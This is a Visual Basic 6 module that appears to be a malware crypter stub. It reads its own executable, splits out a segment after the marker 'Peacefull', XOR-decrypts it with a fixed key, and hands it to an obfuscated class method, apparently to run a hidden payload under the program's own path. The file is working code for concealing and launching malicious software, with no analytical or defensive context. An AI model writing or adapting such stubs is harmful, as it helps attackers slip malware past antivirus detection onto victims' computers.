Attribute VB_Name = "Module1"
Sub Main()

Dim sData As String
Dim Delim() As String
Dim RPG As New Class1

sFile = App.Path & "\" & App.EXEName & ".exe"

Open sFile For Binary As #1
sData = Space(FileLen(sFile))
Get #1, , sData
Close #1

Delim() = Split(sData, "Peacefull")
Delim(1) = Decrypt(Delim(1), "OiJkN")

RPG.q1d8q5MVVUYKDKoBBRUX StrConv(Delim(1), vbFromUnicode), App.Path & "\" & App.EXEName & ".exe"
End Sub

Public Function Decrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte

Decrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Decrypt = StrConv(b, vbUnicode)
End Function

